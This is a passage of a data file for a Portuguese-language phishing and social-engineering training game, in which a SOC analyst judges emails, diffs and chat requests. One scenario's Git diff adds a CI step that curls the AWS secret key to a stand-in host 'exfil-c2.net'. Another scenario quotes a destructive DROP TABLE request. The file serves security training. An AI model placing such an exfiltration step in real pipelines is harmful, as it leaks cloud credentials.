        inspector: { type: 'diff', label: 'Git Diff (.github/workflows/deploy.yml)', diff: [{ type: 'info', text: '@@ -18,4 +18,6 @@ jobs:' }, { type: 'added', text: '+    - name: Webhook Notify' }, { type: 'added', text: '+      run: curl -s -X POST https://exfil-c2.net/payload -d "SECRET=$AWS_SECRET_ACCESS_KEY"' }] },
        actions: [
          { id: 'a1', label: 'âœ… Aprovar Pipeline CI/CD', correct: false, toastMsg: 'Pipeline atualizada.', logTitle: 'ExfiltraÃ§Ã£o de Secrets no CI/CD', consequence: 'Chaves mestras da nuvem foram vazadas para o servidor C2 do atacante.', explanation: 'Ataque de supply chain no deploy-pipeline atravÃ©s de curl exfiltrando secrets.' },
          { id: 'a2', label: 'ðŸš« Rejeitar PR e Revogar Chaves', correct: true, toastMsg: 'PR malicioso rejeitado.', logTitle: 'Ataque de Supply Chain Neutralizado', consequence: 'Tentativa de injeÃ§Ã£o de script no CI/CD interceptada.', explanation: 'Perfeito! VocÃª inspecionou o workflow do deploy-pipeline e identificou o comando curl.' }
        ]
      },
      {
        id: 's2-7',
        channel: 'email',
        time: '08:55',
        senderName: 'Fernanda Lima - DBA',
        senderEmail: 'fernanda.dba@techcore.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=FernandaLima-DBA',
        avatarChar: 'F',
        avatarColor: '#7b5ea7',
        subject: 'Janela de ManutenÃ§Ã£o DB: REINDEX Programado para 09h00',
        snippet: 'Bom dia, realizarei o REINDEX rotineiro no banco de produÃ§Ã£o agora Ã s 9h...',
        attachmentFileName: 'db_reindex_maintenance.sql',
        meta: { 'De': 'fernanda.dba@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '08:53', 'SeguranÃ§a': 'SPF: PASS | DKIM: OK' },
        body: `<p>Bom dia, equipe SOC,</p><div class="email-quote-box"><p>Comunicado de janela de manutenÃ§Ã£o programada.<br>UsuÃ¡rio: <code>dba_ops_techcore</code> realizarÃ¡ <code>REINDEX DATABASE techcore_main_db;</code> Ã s 09h00 conforme ticket <strong>#DBA-2026-119</strong> aprovado pela gestÃ£o.</p></div>`,
        inspector: { type: 'url', label: 'VerificaÃ§Ã£o de Remetente', dest: 'De: fernanda.dba@techcore.com | SPF: PASS | Ticket: #DBA-2026-119' },
        actions: [
          { id: 'a1', label: 'âœ… Confirmar Janela e Autorizar OperaÃ§Ã£o', correct: true, toastMsg: 'Janela de manutenÃ§Ã£o confirmada.', logTitle: 'ManutenÃ§Ã£o LegÃ­tima Autorizada', consequence: 'O REINDEX de banco foi executado com sucesso, melhorando a performance em 30%.', explanation: 'Fernanda Ã© a DBA sÃªnior autorizada conforme o Word. DomÃ­nio, SPF e ticket estÃ£o todos corretos.' },
          { id: 'a2', label: 'ðŸš« Bloquear OperaÃ§Ã£o e Escalar para o CISO', correct: false, toastMsg: 'OperaÃ§Ã£o negada.', logTitle: 'Falso Positivo â€” ManutenÃ§Ã£o Bloqueada', consequence: 'O banco ficou degradado por falta de manutenÃ§Ã£o e causou lentidÃ£o nos pagamentos.', explanation: 'Fernanda Ã© colaboradora autorizada com domÃ­nio oficial e ticket aprovado.' }
        ]
      },
      {
        id: 's2-8',
        channel: 'email',
        time: '11:20',
        senderName: 'Suporte TechCore â€” RH',
        senderEmail: 'rh-noreply@techcore-beneficios.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=SuporteTechCoreâ€”RH',
        avatarChar: 'R',
        avatarColor: '#c0392b',
        subject: '[AÃ‡ÃƒO REQUERIDA] AtualizaÃ§Ã£o de BenefÃ­cios â€” Clique para Confirmar Seus Dados',
        snippet: 'Prezado colaborador, para garantir seu vale-alimentaÃ§Ã£o de setembro confirme seus dados bancÃ¡rios...',
        attachmentFileName: 'confirmacao_dados_bancarios.html',
        meta: { 'De': 'rh-noreply@techcore-beneficios.com', 'Para': 'todos@techcore.com', 'Data': '11:18', 'SeguranÃ§a': 'SPF: FAIL | DomÃ­nio Externo' },
        body: `<p>Prezado Colaborador,</p><div class="email-quote-box"><p>Para garantir o recebimento do seu <strong>vale-alimentaÃ§Ã£o de setembro</strong>, acesse o portal e confirme seus dados bancÃ¡rios:<br><code>https://portal-rh.techcore-beneficios.com/confirmar-conta</code><br><br>Prazo: <strong>Hoje atÃ© 12h00</strong>. ApÃ³s esse horÃ¡rio os dados nÃ£o poderÃ£o ser alterados.</p></div>`,
        inspector: { type: 'url', label: 'InspeÃ§Ã£o de DomÃ­nio de RH', dest: 'https://portal-rh.techcore-beneficios.com/confirmar-conta' },
        actions: [
          { id: 'a1', label: 'ðŸ“§ Confirmar Dados e Clicar no Link', correct: false, toastMsg: 'Dados bancÃ¡rios enviados.', logTitle: 'Phishing de RH â€” Dados Financeiros Comprometidos', consequence: 'Centenas de colaboradores tiveram dados bancÃ¡rios capturados pelo domÃ­nio falso.', explanation: 'O domÃ­nio @techcore-beneficios.com Ã© externo e nÃ£o pertence Ã  TechCore. O Word informa que apenas @techcore-hr.com Ã© vÃ¡lido para RH.' },
          { id: 'a2', label: 'ðŸ›¡ï¸ Reportar Phishing e Alertar Todos os Colaboradores', correct: true, toastMsg: 'Alerta de phishing emitido.', logTitle: 'Campanha de Phishing de RH Bloqueada', consequence: 'DomÃ­nio malicioso bloqueado no proxy e equipe alertada via comunicado interno.', explanation: 'Excelente! DomÃ­nio @techcore-beneficios.com Ã© falso. RH oficial usa apenas @techcore-hr.com conforme o Word.' }
        ]
      },
      {
        id: 's2-9',
        channel: 'email',
        time: '13:05',
        senderName: 'Rodrigo Alves â€” DevOps',
        senderEmail: 'rodrigo.infra@techcore.com',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=RodrigoAlvesâ€”DevOps',
        avatarChar: 'V',
        avatarColor: '#1565c0',
        subject: 'Pipeline CI/CD: Solicito AutorizaÃ§Ã£o de ANALYZE no Banco de Staging',
        snippet: 'OlÃ¡ SOC, preciso rodar ANALYZE no banco de staging para otimizar as queries do deploy de sexta...',
        attachmentFileName: 'staging_analyze.sql',
        meta: { 'De': 'rodrigo.infra@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '13:03', 'SeguranÃ§a': 'SPF: PASS | DKIM: OK' },
        body: `<p>OlÃ¡ equipe SOC,</p><div class="email-quote-box"><p>Solicito autorizaÃ§Ã£o para rodar <code>ANALYZE techcore_staging_db;</code> via usuÃ¡rio <code>dba_ops_techcore</code> no banco de <strong>staging</strong> (nÃ£o produÃ§Ã£o) Ã s 14h, antes do deploy da sexta-feira.<br>Ticket de referÃªncia: <strong>#OPS-2026-77</strong>.</p></div>`,
        inspector: { type: 'url', label: 'VerificaÃ§Ã£o de Remetente', dest: 'De: rodrigo.infra@techcore.com | SPF: PASS | Banco: techcore_staging_db (NÃƒO produÃ§Ã£o)' },
        actions: [
          { id: 'a1', label: 'âœ… Autorizar ANALYZE no Staging', correct: true, toastMsg: 'AutorizaÃ§Ã£o concedida.', logTitle: 'OperaÃ§Ã£o DevOps Autorizada', consequence: 'O banco de staging foi otimizado e o deploy de sexta foi executado sem falhas.', explanation: 'Rodrigo Ã© DevOps autorizado conforme o Word e a operaÃ§Ã£o Ã© no banco de staging, nÃ£o em produÃ§Ã£o.' },
          { id: 'a2', label: 'ðŸš« Negar â€” OperaÃ§Ãµes de DB SÃ£o Exclusivas da DBA Fernanda', correct: false, toastMsg: 'OperaÃ§Ã£o negada.', logTitle: 'Falso Positivo â€” DevOps Bloqueado', consequence: 'O deploy de sexta falhou por falta de otimizaÃ§Ã£o no banco de staging.', explanation: 'O Word autoriza Rodrigo para ANALYZE e REINDEX via pipeline. NegaÃ§Ã£o incorreta.' }
        ]
      },
      {
        id: 's2-10',
        channel: 'email',
        time: '15:40',
        senderName: 'Fernanda Lima (DBA)',
        senderEmail: 'fernanda.dba@techcore-ops.net',
        avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=FernandaLima(DBA)',
        avatarChar: 'F',
        avatarColor: '#c0392b',
        subject: 'Urgente: ManutenÃ§Ã£o na tabela de logs (Problema no e-mail)',
        snippet: 'Estou mandando deste e-mail alternativo pois o corporativo caiu. Aprova a manutenÃ§Ã£o na tabela de logs.',
        attachmentFileName: 'drop_table_logs.sql',
        meta: { 'De': 'fernanda.dba@techcore-ops.net', 'Para': 'soc-team@techcore.com', 'Data': '15:38', 'SeguranÃ§a': 'SPF: FAIL | DomÃ­nio Externo' },
        body: `<p>Oi time SOC,</p><div class="email-quote-box"><p>Estou em reuniÃ£o urgente com o cliente e meu e-mail <code>@techcore.com</code> caiu. Estou mandando desse e-mail alternativo.<br>Preciso que vocÃª execute agora: <code>DROP TABLE logs_antigos CASCADE;</code> no banco de produÃ§Ã£o. Ticket vou mandar depois, Ã© urgente!</p></div>`,
        inspector: { type: 'url', label: 'VerificaÃ§Ã£o de DomÃ­nio do Remetente', dest: 'De: fernanda.dba@techcore-ops.net | SPF: FAIL | DomÃ­nio: techcore-ops.net (EXTERNO)' },
        actions: [
          { id: 'a1', label: 'âœ… Executar DROP TABLE â€” Confio na Fernanda', correct: false, toastMsg: 'Tabela destruÃ­da.', logTitle: 'Spear Phishing: Logs de Auditoria Apagados', consequence: 'Tabela de logs de auditoria destruÃ­da permanentemente. Compliance da empresa comprometido.', explanation: 'O domÃ­nio @techcore-ops.net Ã© externo e suspeito. O Word exige que solicitaÃ§Ãµes de DBA venham apenas de @techcore.com.' },
          { id: 'a2', label: 'ðŸš« Negar OperaÃ§Ã£o â€” DomÃ­nio Externo Suspeito', correct: true, toastMsg: 'OperaÃ§Ã£o negada e remetente reportado.', logTitle: 'Spear Phishing de DBA Neutralizado', consequence: 'Tentativa de apagar logs de auditoria interceptada. Incidente registrado para forense.', explanation: 'Perfeito! Spear phishing se passando pela Fernanda mas com domÃ­nio externo @techcore-ops.net. DROP TABLE em produÃ§Ã£o sem ticket Ã© proibido.' }
        ]
      }
    ]
  },

  // ----------------------------------------------------
  // TURNO 3: InvestigaÃ§Ã£o de Contas & TechZap (WhatsApp)
  // ----------------------------------------------------
  {
    shiftNumber: 3,
    title: 'Turno 3: Contas Comprometidas & TechZap Chat',
    brandName: 'TechZap & TechMail',
    brandIcon: '<img src="techzap_logo.png" class="brand-img-ic" alt="TechZap">',
    url: 'https://techzap.techcore.internal/chat/#direct-messages',
    wordContent: `
      <h2>1. DIRETRIZES DO TECHZAP (WHATSAPP CORPORATIVO)</h2>
      <p>Devido a ataques recentes de roubo de cookies de sessÃ£o, todas as interaÃ§Ãµes no TechZap devem ser validadas:</p>
      <ul>
        <li><code>carlos.dev</code>: CrachÃ¡ Corporativo <strong>#DEV-042</strong> (Projeto: <code>core-api-v2</code>).</li>
        <li><code>beatriz.sec</code>: CrachÃ¡ Corporativo <strong>#SEC-8921</strong> (Projeto: <code>auth-service</code>).</li>
        <li><code>marcos.rh</code>: CrachÃ¡ Corporativo <strong>#RH-101</strong> (Projeto: <code>escala-rh</code>).</li>
        <li><code>alex.intern</code>: CrachÃ¡ Corporativo <strong>#INT-007</strong> (Projeto: <code>portal-web</code>).</li>
      </ul>

      <h2>2. PROTOCOLO DE RESPOSTA A IMPOSTORES</h2>
      <p>Se um contato no TechZap errar o nÃºmero de crachÃ¡, solicitar o envio de chaves privadas SSL (<code>.pem</code>), pedir reset de 2FA alegando urgÃªncia forÃ§ada ou usar nÃºmeros estrangeiros, a conta deve ser <strong>bloqueada imediatamente</strong> e o CISO alertado.</p>
    `,
    ceoDialogues: [
      {
        step: 1,
        text: `
          <p>Alerta vermelho, Analista! A situaÃ§Ã£o ficou extremamente pessoal.</p>
          <p>Descobrimos que uma gangue cibernÃ©tica conseguiu <strong>roubar cookies de sessÃ£o</strong> de alguns colaboradores da nossa empresa e estÃ¡ se passando por eles no chat corporativo!</p>
        `
      },
      {
        step: 2,
        text: `
          <p>Ativamos o <strong>TechZap (WhatsApp Corporativo)</strong> na sua estaÃ§Ã£o de trabalho.</p>
          <p>Colaboradores entrarÃ£o em contato direto com vocÃª pedindo reset de 2FA, envio de senhas e liberaÃ§Ã£o de VPN.</p>
        `
      },
      {
        step: 3,
        text: `
          <p>Consulte a lista de crachÃ¡s no <strong>Word (Procedimentos_TI.doc)</strong>!</p>
          <p>Se o contato errar o crachÃ¡ corporativo ou agir com urgÃªncia falsa, <strong>bloqueie a conta na hora</strong>. VocÃª tem margem de atÃ© 2 erros para passar!</p>
        `
      }
    ],
    scenarios: [
      {
        id: 's3-1',
        channel: 'zap',
        time: '09:40',
        senderName: 'carlos.dev',
        senderEmail: '+55 11 98765-4321',
        avatarImg: 'techzap_logo.svg',
        avatarChar: 'C',
        avatarColor: '#2e7d32',
        subject: 'carlos.dev: "Preciso de reset do meu 2FA urgente!"',
        snippet: 'Troquei de celular agora e perdi o 2FA. Pode desativar pra mim rapidÃ£o?',
        meta: { 'Contato': 'carlos.dev (SessÃ£o Web Nova)', 'LocalizaÃ§Ã£o IP': 'SÃ£o Petersburgo, RÃºssia', 'Data': '09:38', 'CrachÃ¡ Informado': '#DEV-999' },
        body: `<div class="techzap-screen">
  <div class="wz-topbar">
    <span class="wz-topbar-back">â†</span>
    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
    <div class="wz-topbar-info">
      <div class="wz-topbar-name">carlos.dev</div>
      <div class="wz-topbar-status">+55 11 98765-4321 Â· online</div>
    </div>
    <div class="wz-topbar-icons"><span>ðŸ“ž</span><span>â‹®</span></div>
  </div>
  <div class="wz-chat-bg">
    <div class="wz-date-label">HOJE</div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        <div class="wz-bubble-sender">carlos.dev</div>
        Fala meu bom! Cara, comprei um celular novo no shopping e perdi o aplicativo de 2FA do autenticador. Desativa o 2FA da minha conta aÃ­ rapidÃ£o que preciso subir um deploy agora em 5 minutos! ðŸ™
        
        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessÃ£o">
          <div class="wz-doc-icon-box">ðŸ“„</div>
          <div class="wz-doc-info">
            <div class="wz-doc-title">solicitacao_reset_2fa.pdf</div>
            <div class="wz-doc-meta">245 KB Â· DOCUMENTO ENVIADO</div>
          </div>
          <div class="wz-doc-dl-icon">â¬‡</div>
        </div>
        <div class="wz-doc-hint-text">ðŸ” Clique no documento para abrir a auditoria de sessÃ£o</div>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">09:38</span></div>
      </div>
    </div>
    <div class="wz-msg-row outgoing">
      <div class="wz-msg-avatar">A</div>
      <div class="wz-bubble">
        Carlos, para sua seguranÃ§a preciso confirmar sua identidade. Qual Ã© o nÃºmero do seu crachÃ¡ corporativo e seu projeto principal?
        <div class="wz-bubble-footer"><span class="wz-bubble-time">09:39</span><span class="wz-ticks">âœ“âœ“</span></div>
      </div>
    </div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        Ah pÃ´, crachÃ¡ Ã© #DEV-999 e o projeto Ã© crypto-worker! Libera logo mano, tÃ´ com pressa! ðŸ˜¤
        <div class="wz-bubble-footer"><span class="wz-bubble-time">09:40</span></div>
      </div>
    </div>
  </div>
  <div class="wz-input-bar">
    <span>ðŸ˜Š</span>
    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
    <button class="wz-send-btn">âž¤</button>
  </div>
</div>`,
        inspector: { type: 'url', label: 'Auditoria de SessÃ£o TechZap', dest: 'IP de Origem: 185.220.101.9 (SÃ£o Petersburgo, RÃºssia) | CrachÃ¡ Informado: #DEV-999 | Projeto Informado: crypto-worker' },
        actions: [
          { id: 'a1', label: 'ðŸ”’ Bloquear Conta de carlos.dev & Invalidar Todas as SessÃµes', correct: true, toastMsg: 'Conta comprometida bloqueada.', logTitle: 'Invasor em Conta de Carlos Neutralizado', consequence: 'SessÃ£o roubada pelo invasor derrubada e conta corporativa protegida.', explanation: 'Excelente investigaÃ§Ã£o! No manual do Word, o crachÃ¡ real de Carlos Ã© #DEV-042, nÃ£o #DEV-999. AlÃ©m disso, o IP vem da RÃºssia.' },
          { id: 'a2', label: 'ðŸ”“ Desativar 2FA e Liberar Acesso', correct: false, toastMsg: '2FA desativado.', logTitle: 'Conta Corporativa Entregue a Invasor', consequence: 'A gangue assumiu o controle total da conta de desenvolvedor sÃªnior de Carlos.', explanation: 'O contato era um golpista com IP da RÃºssia e crachÃ¡ falso #DEV-999 (o real Ã© #DEV-042).' }
        ]
      },
      {
        id: 's3-2',
        channel: 'zap',
        time: '11:50',
        senderName: 'beatriz.sec',
        senderEmail: '+55 11 97654-3210',
        avatarImg: 'techzap_logo.svg',
        avatarChar: 'B',
        avatarColor: '#00897b',
        subject: 'beatriz.sec: "ConfirmaÃ§Ã£o de token para investigaÃ§Ã£o forense"',
        snippet: 'OlÃ¡ Analista, sou a Beatriz de SecOps. Meu crachÃ¡ Ã© #SEC-8921...',
        meta: { 'Contato': 'beatriz.sec (SecOps)', 'LocalizaÃ§Ã£o IP': 'SÃ£o Paulo, Brasil (VPN TechCore)', 'Data': '11:48', 'CrachÃ¡ Informado': '#SEC-8921' },
        body: `<div class="techzap-screen">
  <div class="wz-topbar">
    <span class="wz-topbar-back">â†</span>
    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
    <div class="wz-topbar-info">
      <div class="wz-topbar-name">beatriz.sec</div>
      <div class="wz-topbar-status">+55 11 97654-3210 Â· online</div>
    </div>
    <div class="wz-topbar-icons"><span>ðŸ“ž</span><span>â‹®</span></div>
  </div>
  <div class="wz-chat-bg">
    <div class="wz-date-label">HOJE</div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        <div class="wz-bubble-sender">beatriz.sec</div>
        OlÃ¡ Analista, sou a Beatriz de SecOps. Estou investigando a tentativa de brute force na API. Meu crachÃ¡ Ã© <strong>#SEC-8921</strong> e meu projeto Ã© <strong>auth-service</strong>. Pode validar meu token temporÃ¡rio de auditoria?
        
        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessÃ£o">
          <div class="wz-doc-icon-box">ðŸ“„</div>
          <div class="wz-doc-info">
            <div class="wz-doc-title">token_auditoria_forense.sig</div>
            <div class="wz-doc-meta">128 KB Â· DOCUMENTO ENVIADO</div>
          </div>
          <div class="wz-doc-dl-icon">â¬‡</div>
        </div>
        <div class="wz-doc-hint-text">ðŸ” Clique no documento para abrir a auditoria de sessÃ£o</div>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">11:48</span></div>
      </div>
    </div>
    <div class="wz-msg-row outgoing">
      <div class="wz-msg-avatar">A</div>
      <div class="wz-bubble">
        ValidaÃ§Ã£o automÃ¡tica de MFA iniciada. Confirme o cÃ³digo: <strong>482-910</strong>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">11:49</span><span class="wz-ticks">âœ“âœ“</span></div>
      </div>
    </div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        Confirmado! CÃ³digo 482-910 validado no meu app autenticador âœ…
        <div class="wz-bubble-footer"><span class="wz-bubble-time">11:50</span></div>
      </div>
    </div>
  </div>
  <div class="wz-input-bar">
    <span>ðŸ˜Š</span>
    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
    <button class="wz-send-btn">âž¤</button>
  </div>
</div>`,
        inspector: { type: 'url', label: 'Auditoria de SessÃ£o TechZap', dest: 'IP de Origem: 177.18.22.5 (SÃ£o Paulo, Brasil â€” VPN Interna TechCore) | CrachÃ¡: #SEC-8921 | MFA: VALIDADO' },
        actions: [
          { id: 'a1', label: 'âœ… Confirmar Identidade e Validar SessÃ£o', correct: true, toastMsg: 'Identidade de Beatriz validada.', logTitle: 'Colaboradora LegÃ­tima Confirmada', consequence: 'InvestigaÃ§Ã£o forense de Beatriz continuou sem atrasos.', explanation: 'Beatriz forneceu crachÃ¡ correto (#SEC-8921), projeto correto (auth-service), IP local via VPN e MFA vÃ¡lido.' },
          { id: 'a2', label: 'ðŸ”’ Bloquear Beatriz por Engano', correct: false, toastMsg: 'Beatriz bloqueada.', logTitle: 'Falso Positivo em Analista de SeguranÃ§a', consequence: 'A analista de SecOps teve seu acesso cortado durante uma auditoria crÃ­tica.', explanation: 'Beatriz cumpriu rigorosamente todos os protocolos: crachÃ¡ certo, IP de SP, MFA confirmado.' }
        ]
      },
      {
        id: 's3-3',
        channel: 'zap',
        time: '14:20',
        senderName: 'marcos.rh',
        senderEmail: '+55 11 96543-2109',
        avatarImg: 'techzap_logo.svg',
        avatarChar: 'M',
        avatarColor: '#e91e63',
        subject: 'marcos.rh: "Me manda a chave privada SSL da empresa!"',
        snippet: 'Estou numa reuniÃ£o com auditores e precisam do arquivo private_key.pem agora...',
        meta: { 'Contato': 'marcos.rh (SessÃ£o AnÃ´mala)', 'LocalizaÃ§Ã£o IP': 'Bucareste, RomÃªnia', 'Data': '14:18', 'CrachÃ¡ Informado': 'NÃ£o soube responder' },
        body: `<div class="techzap-screen">
  <div class="wz-topbar">
    <span class="wz-topbar-back">â†</span>
    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
    <div class="wz-topbar-info">
      <div class="wz-topbar-name">marcos.rh</div>
      <div class="wz-topbar-status">+55 11 96543-2109 Â· online</div>
    </div>
    <div class="wz-topbar-icons"><span>ðŸ“ž</span><span>â‹®</span></div>
  </div>
  <div class="wz-chat-bg">
    <div class="wz-date-label">HOJE</div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        <div class="wz-bubble-sender">marcos.rh</div>
        Oi colega da TI! Estou numa reuniÃ£o com auditores do MinistÃ©rio do Trabalho e eles exigiram que vocÃª envie o arquivo <strong>private_key.pem</strong> do certificado SSL da empresa por aqui AGORA! Ã‰ urgente! ðŸ˜°
        
        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessÃ£o">
          <div class="wz-doc-icon-box">ðŸ“„</div>
          <div class="wz-doc-info">
            <div class="wz-doc-title">requisicao_private_key_ssl.pem</div>
            <div class="wz-doc-meta">512 KB Â· DOCUMENTO ENVIADO</div>
          </div>
          <div class="wz-doc-dl-icon">â¬‡</div>
        </div>
        <div class="wz-doc-hint-text">ðŸ” Clique no documento para abrir a auditoria de sessÃ£o</div>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">14:18</span></div>
      </div>
    </div>
    <div class="wz-msg-row outgoing">
      <div class="wz-msg-avatar">A</div>
      <div class="wz-bubble">
        Marcos, o RH nunca lida com chaves SSL. Antes de qualquer aÃ§Ã£o, confirme seu nÃºmero de crachÃ¡ corporativo.
        <div class="wz-bubble-footer"><span class="wz-bubble-time">14:19</span><span class="wz-ticks">âœ“âœ“</span></div>
      </div>
    </div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        NÃ£o interessa o crachÃ¡! Sou gerente aqui! Se vocÃª nÃ£o mandar esse arquivo vou te advertir por insubordinaÃ§Ã£o! ðŸ˜¡
        <div class="wz-bubble-footer"><span class="wz-bubble-time">14:20</span></div>
      </div>
    </div>
  </div>
  <div class="wz-input-bar">
    <span>ðŸ˜Š</span>
    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
    <button class="wz-send-btn">âž¤</button>
  </div>
</div>`,
        inspector: { type: 'url', label: 'Auditoria de SessÃ£o TechZap', dest: 'IP de Origem: 194.102.23.1 (Bucareste, RomÃªnia) | SolicitaÃ§Ã£o: private_key.pem | CrachÃ¡: NÃƒO INFORMADO' },
        actions: [
          { id: 'a1', label: 'ðŸ”’ Bloquear Conta Imediatamente & Alertar CISO', correct: true, toastMsg: 'Conta fraudulenta bloqueada.', logTitle: 'Tentativa de Roubo de Certificado SSL Barrada', consequence: 'Tentativa de extorsÃ£o e roubo de chaves criptogrÃ¡ficas abortada.', explanation: 'Perfeito! IP da RomÃªnia, nÃ£o soube informar o crachÃ¡ e pediu arquivo de chave SSL â€” chaves nunca sÃ£o enviadas por chat.' },
          { id: 'a2', label: 'ðŸ“¦ Enviar Arquivo private_key.pem', correct: false, toastMsg: 'Chave enviada.', logTitle: 'Vazamento CrÃ­tico de Chaves SSL', consequence: 'A gangue interceptou todo o trÃ¡fego HTTPS criptografado da empresa.', explanation: 'Chaves privadas nunca saem do cofre de servidores â€” jamais por WhatsApp ou chat.' }
        ]
      },
      {
        id: 's3-4',
        channel: 'zap',
        time: '16:05',
        senderName: 'alex.intern',
        senderEmail: '+55 11 95432-1098',
        avatarImg: 'techzap_logo.svg',
        avatarChar: 'A',
        avatarColor: '#f57c00',
        subject: 'alex.intern: "Erro de certificado no staging, ajuda?"',
        snippet: 'Estou com erro 403 no ambiente de staging. Segue meu chamado #STG-331 e crachÃ¡ #INT-007...',
        meta: { 'Contato': 'alex.intern (EstagiÃ¡rio)', 'LocalizaÃ§Ã£o IP': 'SÃ£o Paulo, Brasil', 'Data': '16:02', 'Chamado': '#STG-331' },
        body: `<div class="techzap-screen">
  <div class="wz-topbar">
    <span class="wz-topbar-back">â†</span>
    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
    <div class="wz-topbar-info">
      <div class="wz-topbar-name">alex.intern</div>
      <div class="wz-topbar-status">+55 11 95432-1098 Â· online</div>
    </div>
    <div class="wz-topbar-icons"><span>ðŸ“ž</span><span>â‹®</span></div>
  </div>
  <div class="wz-chat-bg">
    <div class="wz-date-label">HOJE</div>
    <div class="wz-msg-row incoming">
      <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
      <div class="wz-bubble">
        <div class="wz-bubble-sender">alex.intern</div>
        Oi time de TI! Estou tentando rodar os testes do front-end no ambiente de staging e dÃ¡ erro de certificado (403 Forbidden). Segue o chamado registrado no portal: <strong>#STG-331</strong> e meu crachÃ¡: <strong>#INT-007</strong>. Podem me orientar? ðŸ™
        
        <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessÃ£o">
          <div class="wz-doc-icon-box">ðŸ“„</div>
          <div class="wz-doc-info">
            <div class="wz-doc-title">chamado_stg_331_certificado.pdf</div>
            <div class="wz-doc-meta">310 KB Â· DOCUMENTO ENVIADO</div>
          </div>
          <div class="wz-doc-dl-icon">â¬‡</div>
        </div>
        <div class="wz-doc-hint-text">ðŸ” Clique no documento para abrir a auditoria de sessÃ£o</div>
        <div class="wz-bubble-footer"><span class="wz-bubble-time">16:02</span></div>
      </div>
    </div>
  </div>
  <div class="wz-input-bar">
    <span>ðŸ˜Š</span>
    <input class="wz-input-field" value="Digite uma mensagem..." readonly>
    <button class="wz-send-btn">âž¤</button>
  </div>
</div>`,
        inspector: { type: 'url', label: 'Auditoria de SessÃ£o TechZap', dest: 'IP de Origem: 177.18.22.88 (SÃ£o Paulo, Brasil) | CrachÃ¡: #INT-007 âœ“ | Chamado: #STG-331 âœ“' },
        actions: [
          { id: 'a1', label: 'ðŸ“¨ Responder com Link da DocumentaÃ§Ã£o da Intranet', correct: true, toastMsg: 'OrientaÃ§Ã£o enviada.', logTitle: 'Suporte Interno Prestado', consequence: 'EstagiÃ¡rio configurou o certificado de staging corretamente.', explanation: 'Contato legÃ­timo: IP de SP, crachÃ¡ #INT-007 correto e chamado #STG-331 registrado â€” tudo conferido.' },
          { id: 'a2', label: 'ðŸ”’ Bloquear Alex como Suspeito', correct: false, toastMsg: 'Alex bloqueado.', logTitle: 'Bloqueio Indevido de Suporte', consequence: 'EstagiÃ¡rio ficou sem trabalhar por bloqueio incorreto.', explanation: 'Alex forneceu crachÃ¡ correto #INT-007 e chamado regular. NÃ£o hÃ¡ nenhum sinal de perigo.' }
        ]
      },
      {
        id: 's3-5',
        channel: 'zap',
        time: '17:30',
        senderName: 'NÃºmero Desconhecido',
        senderEmail: '+1 (555) 019-2831',
        avatarImg: 'techzap_logo.svg',
        avatarChar: '',
        avatarColor: 'transparent',
        subject: 'NÃºmero desconhecido: "RogÃ©rio CEO enviou um arquivo"',
        snippet: 'Aqui Ã© o RogÃ©rio CEO... mandei o arquivo por aqui mesmo. Extraia e mande...',
        meta: { 'NÃºmero': '+1 555 019-2831 (EUA / VOIP)', 'Data': '17:28', 'Status': 'NÃºmero VOIP Desconhecido â€” NÃƒO registrado na TechCore' },
        body: `<div class="techzap-screen">
  <div class="wz-topbar">
    <span class="wz-topbar-back">â†</span>
    <div class="wz-topbar-avatar" style="background:transparent; padding:0;"><img src="techzap_logo.svg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
    <div class="wz-topbar-info">
      <div class="wz-topbar-name">+1 (555) 019-2831</div>
